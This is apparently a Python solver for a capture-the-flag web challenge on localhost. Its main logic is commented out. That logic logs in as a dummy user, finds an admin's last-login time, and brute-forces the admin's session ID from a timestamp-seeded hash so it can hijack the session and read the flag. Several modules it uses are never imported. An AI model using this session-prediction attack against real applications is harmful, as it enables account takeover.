#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8088"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # NOTE(abi): try this solution.
    # bruteforce_count = -5
    # bruteforce_max = 5

    # register_un = "DummyUser"
    # register_pw = "12345678A+"
    # payload = {"username": register_un, "password": register_pw}

    # s = requests.Session()
    # res = s.post(url + '/register', data=payload)

    # payload = {"username": register_un, "password": register_pw}
    # res = s.post(url + '/login', data=payload)

    # names_regex = re.compile("</td><td>(.+)</td><td>.+</td><td>")
    # names = re.findall(names_regex, res.text)

    # lastLogin_regex = re.compile("Last Login: (.+)</h2>")
    # role_regex = re.compile("Role: (.+)</h2>")

    # for name in names:
    #     payload = {"name": name}
    #     res = s.get(url + '/get-account', params=payload)
    #     role = re.findall(role_regex, res.text)
    #     if role[0] == "admin":
    #         last_login = re.findall(lastLogin_regex, res.text)
    #         if(len(last_login) > 0):
    #             last_login_date = datetime.strptime(last_login[0], "%Y-%m-%d %H:%M:%S")
    #             epoch_time = datetime(1970, 1, 1)
    #             timestamp = (last_login_date - epoch_time)
                
    #             read_timestamp = int(timestamp.total_seconds())
    #             guessed_creation_time = (read_timestamp - 60 * 60 * 24 + 3)
    #             break
    
    # flag = []

    # while bruteforce_count <= bruteforce_max and len(flag) < 1:
    #     creation_time = guessed_creation_time + bruteforce_count
    #     timestamp = read_timestamp
    #     hasher = SHA256.new()
    #     myS = struct.pack('<Qi', creation_time, timestamp)
    #     hasher.update(myS)
    #     seed = int.from_bytes(hasher.digest()[:16], "big")
    #     session_id = uuid.UUID(int=seed, version=4)

    #     new_s = requests.Session()
    #     new_s.cookies["session_id"] = str(session_id)
    #     new_s.cookies["csrf_token"] = s.cookies["csrf_token"]

    #     payload = {"content": "MyContent", "csrf_token":  new_s.cookies["csrf_token"]}
    #     res = new_s.post(url + '/post', data=payload)

    #     bruteforce_count += 1
    #     flag_regex = re.compile("(InfoSec{.+[^}]})")
    #     flag = re.findall(flag_regex, res.text)
    
    # print(flag[0])

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


